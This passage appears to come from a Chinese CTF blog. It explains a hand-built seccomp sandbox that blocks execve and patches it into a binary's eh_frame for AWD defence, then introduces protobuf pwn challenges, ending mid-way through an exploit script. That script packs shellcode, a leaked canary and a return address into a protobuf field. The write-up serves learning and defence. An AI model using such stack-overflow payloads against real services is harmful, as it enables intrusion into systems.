+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        
+        // 允许其他系统调用
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)
+    &#125;;
+    
+    struct sock_fprog prog = &#123;
+        .len = sizeof(filter) / sizeof(filter[0]),
+        .filter = filter
+    &#125;;
+    
+    // 启用 seccomp 过滤模式
+    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != 0) &#123;
+        perror(&quot;prctl&quot;);
+        _exit(1);
+    &#125;
+
+&#125;
+
+int main() &#123;
+    install_seccomp();
+    // 你可以在这里运行原来的程序逻辑
+    system(&quot;/bin/sh&quot;);
+    return 0;
+&#125;
+</code></pre>
+<p>这个 <code>install_seccomp()</code> 函数的作用是通过 <code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用 <code>execve</code> 系统调用。如果程序尝试调用 <code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
+<p>以下是其中每个部分的功能和用法的详细解释：</p>
+<h4 id="struct-sock-filter-filter"><a href="#struct-sock-filter-filter" class="headerlink" title="struct sock_filter filter[]"></a>struct sock_filter filter[]</h4><pre><code class="c">struct sock_filter filter[] = &#123;
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1), 
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)
+&#125;;
+</code></pre>
+<p>这是一个 BPF（Berkeley Packet Filter）过滤器指令数组，用来定义程序的过滤规则。每一条 <code>sock_filter</code> 定义了一条 BPF 指令，用来判断并处理系统调用。</p>
+<p><strong>第一条指令</strong></p>
+<pre><code class="c">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr))
+</code></pre>
+<ul>
+<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code> 结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
+<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
+<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
+<li><code>offsetof(struct seccomp_data, nr)</code> 是 <code>seccomp_data</code> 结构体中 <code>nr</code> 成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
+</ul>
+<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是 <code>execve</code> 系统调用。</p>
+<pre><code class="c">struct seccomp_data &#123;
+    int nr;        // 系统调用号
+    __u32 arch;    // 架构信息
+    __u64 instruction_pointer; // 指令指针
+    __u64 args[6]; // 系统调用参数
+&#125;;
+</code></pre>
+<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct seccomp_data, nr)也可以写为0。</p>
+<p><strong>第二条指令</strong></p>
+<pre><code class="c">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1)
+</code></pre>
+<ul>
+<li><code>BPF_JMP</code> 指令执行跳转。</li>
+<li><code>BPF_JEQ</code> 是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
+<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
+</ul>
+<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code> 的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
+<p><strong>第三条指令</strong></p>
+<pre><code class="c">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)
+</code></pre>
+<ul>
+<li><code>BPF_RET</code> 表示返回结果。</li>
+<li><code>BPF_K</code> 表示一个立即数操作，这里为 <code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到 <code>execve</code> 系统调用时杀死进程。</li>
+</ul>
+<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
+<p><strong>第四条指令</strong></p>
+<pre><code class="c">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)
+</code></pre>
+<ul>
+<li>这条指令会返回 <code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
+</ul>
+<h4 id="struct-sock-fprog-prog"><a href="#struct-sock-fprog-prog" class="headerlink" title="struct sock_fprog prog"></a><strong>struct sock_fprog prog</strong></h4><pre><code class="c">struct sock_fprog prog = &#123;
+    .len = sizeof(filter) / sizeof(filter[0]),
+    .filter = filter
+&#125;;
+</code></pre>
+<ul>
+<li><code>struct sock_fprog</code> 是一个包含 seccomp 过滤器程序的结构体：<ul>
+<li><code>len</code> 表示 <code>filter</code> 数组的长度（指令数量）。通过 <code>sizeof(filter) / sizeof(filter[0])</code> 来计算过滤器中有多少条指令。</li>
+<li><code>filter</code> 是一个指向 <code>sock_filter</code> 数组的指针，用于存储 seccomp 过滤器的指令集。</li>
+</ul>
+</li>
+</ul>
+<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
+<h4 id="prctl-系统调用"><a href="#prctl-系统调用" class="headerlink" title="prctl 系统调用"></a><strong>prctl 系统调用</strong></h4><pre><code class="c">if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != 0) &#123;
+    perror(&quot;prctl&quot;);
+    _exit(1);
+&#125;
+</code></pre>
+<ul>
+<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
+<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
+<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行 seccomp，意味着我们会使用 BPF 过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
+<li><code>&amp;prog</code> 是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
+</ul>
+<p>如果 <code>prctl</code> 调用失败，意味着 seccomp 设置失败，会输出错误信息并终止进程。</p>
+<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT  ，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
+<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
+<pre><code class="c">#ifndef     BPF_STMT
+#define    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;
+#endif
+#ifndef     BPF_JUMP
+#define    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;
+#endif
+</code></pre>
+<p>而sock_filter的结构体定义如下：</p>
+<pre><code class="c">struct sock_filter &#123;
+    __u16   code;   /* BPF opcode */
+    __u8    jt;     /* Jump true */
+    __u8    jf;     /* Jump false */
+    __u32   k;      /* Generic multiuse field */
+&#125;;
+</code></pre>
+<h4 id="其他一些常用的宏定义"><a href="#其他一些常用的宏定义" class="headerlink" title="其他一些常用的宏定义"></a>其他一些常用的宏定义</h4><p>基本都是位掩码，只需要知道其代表的含义即可。</p>
+<pre><code class="c">// 主指令类别（2 位）
+#define BPF_LD          0x00  // Load
+#define BPF_LDX         0x01  // Load with index
+#define BPF_ST          0x02  // Store
+#define BPF_STX         0x03  // Store with index
+#define BPF_ALU         0x04  // ALU (arithmetic logic unit) operation
+#define BPF_JMP         0x05  // Jump
+#define BPF_RET         0x06  // Return
+#define BPF_MISC        0x07  // Miscellaneous
+
+// 操作码的大小（3 位）
+#define BPF_W           0x00  // Word (32-bit)
+#define BPF_H           0x08  // Half-word (16-bit)
+#define BPF_B           0x10  // Byte (8-bit)
+
+// 加载/存储操作的模式（3 位）
+#define BPF_IMM         0x00  // Immediate value
+#define BPF_ABS         0x20  // Absolute
+#define BPF_IND         0x40  // Indirect
+#define BPF_MEM         0x60  // Memory
+#define BPF_LEN         0x80  // Packet length
+#define BPF_MSH         0xA0  // Modulo shift
+
+// 计算和比较操作的源（1 位）
+#define BPF_K           0x00  // Constant
+#define BPF_X           0x08  // Register
+
+// ALU 运算符（4 位）
+#define BPF_ADD         0x00  // Addition
+#define BPF_SUB         0x10  // Subtraction
+#define BPF_MUL         0x20  // Multiplication
+#define BPF_DIV         0x30  // Division
+#define BPF_OR          0x40  // Bitwise OR
+#define BPF_AND         0x50  // Bitwise AND
+#define BPF_LSH         0x60  // Left shift
+#define BPF_RSH         0x70  // Right shift
+#define BPF_NEG         0x80  // Negation
+#define BPF_MOD         0x90  // Modulo
+#define BPF_XOR         0xA0  // Bitwise XOR
+
+// 跳转条件（4 位）
+#define BPF_JA          0x00  // Jump unconditionally
+#define BPF_JEQ         0x10  // Jump if equal
+#define BPF_JGT         0x20  // Jump if greater than
+#define BPF_JGE         0x30  // Jump if greater or equal
+#define BPF_JSET        0x40  // Jump if bits are set
+
+// Return 操作码
+#define BPF_RET         0x06  // Return
+#define SECCOMP_RET_KILL 0x00000000  // Kill process
+#define SECCOMP_RET_ALLOW 0x7fff0000 // Allow syscall
+
+//对seccomp mode 进行操作
+#define PR_GET_SECCOMP      21
+#define PR_SET_SECCOMP     22
+</code></pre>
+<h3 id="二、调试获取汇编写法"><a href="#二、调试获取汇编写法" class="headerlink" title="二、调试获取汇编写法"></a>二、调试获取汇编写法</h3><p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
+<pre><code class="asm">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20
+0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0
+0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0
+0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0
+0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15
+0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0
+0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1
+0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b
+0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6
+0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0
+0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0
+0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0
+0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6
+0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0
+0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0
+0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000
+0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4
+0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#39; &#39; */
+0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#39; &#39; */
+0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4
+0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4
+0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2
+0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16
+0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0
+0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;
+</code></pre>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151136186.png" class="">
+
+<p>最后整个prog结构体的地址是存在rdx中，也就是rbp - 0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151151584.png" class="">
+
+<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
+<pre><code class="c">0x7ffff7eae338 &lt;prctl+8&gt;        mov    r10, rcx                        R10 =&gt; 0x555555557da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555180 (__do_global_dtors_aux) ◂— endbr64
+0x7ffff7eae33b &lt;prctl+11&gt;       mov    qword ptr [rsp + 0x28], rsi     [0x7fffffffe408] =&gt; 2
+0x7ffff7eae340 &lt;prctl+16&gt;       mov    qword ptr [rsp + 0x30], rdx     [0x7fffffffe410] =&gt; 0x7fffffffe440 ◂— 4
+0x7ffff7eae345 &lt;prctl+21&gt;       mov    qword ptr [rsp + 0x38], rcx     [0x7fffffffe418] =&gt; 0x555555557da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555180 (__do_global_dtors_aux) ◂— endbr64
+0x7ffff7eae34a &lt;prctl+26&gt;       mov    qword ptr [rsp + 0x40], r8      [0x7fffffffe420] =&gt; 0x7ffff7fa3f10 (initial+16) ◂— 4
+0x7ffff7eae34f &lt;prctl+31&gt;       mov    rax, qword ptr fs:[0x28]        RAX, [0x7ffff7d85768] =&gt; 0xc68810ecdaf50d00
+0x7ffff7eae358 &lt;prctl+40&gt;       mov    qword ptr [rsp + 0x18], rax     [0x7fffffffe3f8] =&gt; 0xc68810ecdaf50d00
+0x7ffff7eae35d &lt;prctl+45&gt;    xor    eax, eax                        EAX =&gt; 0
+0x7ffff7eae35f &lt;prctl+47&gt;    lea    rax, [rsp + 0x60]               RAX =&gt; 0x7fffffffe440 ◂— 4
+0x7ffff7eae364 &lt;prctl+52&gt;    mov    dword ptr [rsp], 8              [0x7fffffffe3e0] =&gt; 8
+0x7ffff7eae36b &lt;prctl+59&gt;    mov    qword ptr [rsp + 8], rax        [0x7fffffffe3e8] =&gt; 0x7fffffffe440 ◂— 4
+0x7ffff7eae370 &lt;prctl+64&gt;    lea    rax, [rsp + 0x20]               RAX =&gt; 0x7fffffffe400 ◂— 0
+0x7ffff7eae375 &lt;prctl+69&gt;    mov    qword ptr [rsp + 0x10], rax     [0x7fffffffe3f0] =&gt; 0x7fffffffe400 ◂— 0
+0x7ffff7eae37a &lt;prctl+74&gt;    mov    eax, 0x9d                       EAX =&gt; 0x9d
+0x7ffff7eae37f &lt;prctl+79&gt;    syscall  &lt;SYS_prctl&gt;
+</code></pre>
+<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
+<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是 <a href="https://github.com/aftern00n/AwdPwnPatcher">https://github.com/aftern00n/AwdPwnPatcher</a> 这个库，我们可以把call init patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151211381.png" class="">
+
+<img src="/2024/09/21/self-made-sandbox/image-20240921151222496.png" class="">
+
+<pre><code class="python">from AwdPwnPatcher import *
+from pwn import *
+
+binary = &quot;./pwn&quot;
+awd_pwn_patcher = AwdPwnPatcher(binary)
+sock_filter = p64(0x20) + p64(0x3b01000015) + p64(6) + p64(0x7fff000000000006)
+sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)
+
+prog = p64(4) + p64(sock_filter_addr)
+prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)
+
+assembly = f&quot;&quot;&quot;
+    mov rax,157
+    mov rdi,22
+    mov rsi,2
+    lea rdx,[&#123;prog_addr&#125;]
+    syscall
+    call 0x40117A
+&quot;&quot;&quot;
+
+awd_pwn_patcher.patch_by_jmp(jmp_from=0x4011F0,jmp_to=0x4011F5,assembly=assembly)
+awd_pwn_patcher.save()
+</code></pre>
+<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据<a href="https://blog.csdn.net/qq_46106285/article/details/124972056">https://blog.csdn.net/qq_46106285/article/details/124972056</a> 这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
+<p>运行没有patch过的程序：</p>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151236768.png" class="">
+
+<p>经过patch之后：</p>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151247626.png" class="">
+
+<img src="/2024/09/21/self-made-sandbox/image-20240921151256919.png" class="">
+
+<img src="/2024/09/21/self-made-sandbox/image-20240921151305738.png" class="">
+
+<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
+<h3 id="三、自动化工具"><a href="#三、自动化工具" class="headerlink" title="三、自动化工具"></a>三、自动化工具</h3><p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
+<p>效果图：</p>
+<img src="/2024/09/21/self-made-sandbox/image-20240921151317438.png" class="">
+
+<img src="/2024/09/21/self-made-sandbox/image-20240921151328087.png" class="">
+
+<p><a href="https://github.com/collectcrop/SandboxAttacher">https://github.com/collectcrop/SandboxAttacher</a></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>sandbox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>protobuf初探</title>
+    <url>/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h2 id="protobuf-pwn初探"><a href="#protobuf-pwn初探" class="headerlink" title="protobuf pwn初探"></a>protobuf pwn初探</h2><h4 id="protobuf简介"><a href="#protobuf简介" class="headerlink" title="protobuf简介"></a>protobuf简介</h4><p>Protocol Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
+<ol>
+<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
+<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
+<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
+<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
+</ol>
+<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
+<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
+<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
+<h4 id="工具集安装"><a href="#工具集安装" class="headerlink" title="工具集安装"></a>工具集安装</h4><ul>
+<li>pbtk:（自动化分析）</li>
+</ul>
+<pre><code>sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5
+sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client
+git clone https://github.com/marin-m/pbtk
+</code></pre>
+<ul>
+<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
+</ul>
+<pre><code class="shell">sudo apt-get update
+sudo apt-get install -y protobuf-compiler libprotobuf-dev		
+sudo apt-get install libprotobuf-c-dev protobuf-c-compiler
+</code></pre>
+<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要</p>
+<h4 id="一些结构体定义"><a href="#一些结构体定义" class="headerlink" title="一些结构体定义"></a>一些结构体定义</h4><h6 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h6><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
+                      class=""
+                >
+
+<pre><code class="c">struct ProtobufCFieldDescriptor &#123;
+    /** Name of the field as given in the .proto file. */
+    const char      *name;				
+
+    /** Tag value of the field as given in the .proto file. */
+    uint32_t        id;					
+
+    /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
+    ProtobufCLabel      label;					
+
+    /** The type of the field. */
+    ProtobufCType       type;					
+
+    /**
+     * The offset in bytes of the message&#39;s C structure&#39;s quantifier field
+     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
+     * for repeated members or the case enum for oneofs).
+     */
+    unsigned        quantifier_offset;							
+
+    /**
+     * The offset in bytes into the message&#39;s C structure for the member
+     * itself.
+     */
+    unsigned        offset;					
+
+    /**
+     * A type-specific descriptor.
+     *
+     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
+     * corresponding `ProtobufCEnumDescriptor`.
+     *
+     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
+     * the corresponding `ProtobufCMessageDescriptor`.
+     *
+     * Otherwise this field is NULL.
+     */
+    const void      *descriptor; /* for MESSAGE and ENUM types */
+
+    /** The default value for this field, if defined. May be NULL. */
+    const void      *default_value;
+
+    /**
+     * A flag word. Zero or more of the bits defined in the
+     * `ProtobufCFieldFlag` enum may be set.
+     */
+    uint32_t        flags;
+
+    /** Reserved for future use. */
+    unsigned        reserved_flags;
+    /** Reserved for future use. */
+    void            *reserved2;
+    /** Reserved for future use. */
+    void            *reserved3;
+&#125;;
+</code></pre>
+<h6 id="label和type"><a href="#label和type" class="headerlink" title="label和type"></a>label和type</h6><p>label和type都是枚举类型：</p>
+<pre><code class="c">typedef enum &#123;
+    /** A well-formed message must have exactly one of this field. */
+    PROTOBUF_C_LABEL_REQUIRED,
+
+    /**
+     * A well-formed message can have zero or one of this field (but not
+     * more than one).
+     */
+    PROTOBUF_C_LABEL_OPTIONAL,
+
+    /**
+     * This field can be repeated any number of times (including zero) in a
+     * well-formed message. The order of the repeated values will be
+     * preserved.
+     */
+    PROTOBUF_C_LABEL_REPEATED,
+
+    /**
+     * This field has no label. This is valid only in proto3 and is
+     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.
+     */
+    PROTOBUF_C_LABEL_NONE,
+&#125; ProtobufCLabel;
+
+
+typedef enum &#123;
+    PROTOBUF_C_TYPE_INT32,      /**0&lt; int32 */
+    PROTOBUF_C_TYPE_SINT32,     /**1&lt; signed int32 */
+    PROTOBUF_C_TYPE_SFIXED32,   /**2&lt; signed int32 (4 bytes) */
+    PROTOBUF_C_TYPE_INT64,      /**3&lt; int64 */
+    PROTOBUF_C_TYPE_SINT64,     /**4&lt; signed int64 */
+    PROTOBUF_C_TYPE_SFIXED64,   /**5&lt; signed int64 (8 bytes) */
+    PROTOBUF_C_TYPE_UINT32,     /**6&lt; unsigned int32 */
+    PROTOBUF_C_TYPE_FIXED32,    /**7&lt; unsigned int32 (4 bytes) */
+    PROTOBUF_C_TYPE_UINT64,     /**8&lt; unsigned int64 */
+    PROTOBUF_C_TYPE_FIXED64,    /**9&lt; unsigned int64 (8 bytes) */
+    PROTOBUF_C_TYPE_FLOAT,      /**10&lt; float */
+    PROTOBUF_C_TYPE_DOUBLE,     /**11&lt; double */
+    PROTOBUF_C_TYPE_BOOL,       /**12&lt; boolean */
+    PROTOBUF_C_TYPE_ENUM,       /**13&lt; enumerated type */
+    PROTOBUF_C_TYPE_STRING,     /**14&lt; UTF-8 or ASCII string */
+    PROTOBUF_C_TYPE_BYTES,      /**15&lt; arbitrary byte sequence */
+    PROTOBUF_C_TYPE_MESSAGE,    /**16&lt; nested message */
+&#125; ProtobufCType;
+</code></pre>
+<h4 id="定位结构体方式"><a href="#定位结构体方式" class="headerlink" title="定位结构体方式"></a>定位结构体方式</h4><h5 id="1-手动定位"><a href="#1-手动定位" class="headerlink" title="1.手动定位"></a>1.手动定位</h5><p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
+                      class=""
+                >
+
+<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
+                      class=""
+                >
+
+<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
+                      class=""
+                >
+
+<pre><code class="c">//message.proto
+syntax = &quot;proto2&quot;;
+
+message MyMessage&#123;
+    optional string name = 1;
+    required bytes buffer = 3;
+    required uint32 size = 4;
+&#125;
+</code></pre>
+<p>然后在命令行将其转化成python文件即可</p>
+<pre><code class="shell">protoc --python_out=. message.proto
+</code></pre>
+<h5 id="2-自动分析"><a href="#2-自动分析" class="headerlink" title="2.自动分析"></a>2.自动分析</h5><p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code> 就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
+<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
+<pre><code class="python">import message_pb2
+from pwn import *
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]
+p = process(&quot;filename&quot;)
+......
+msg = message_pb2.MyMessage()		#创建结构体
+
+#各字段赋值
+msg.name = &#39;Admin&#39;
+msg.buffer = shellcode.ljust(0x208,b&quot;a&quot;) + p64(canary) + p64(0) + p64(tar)
+msg.size = 0x220
+
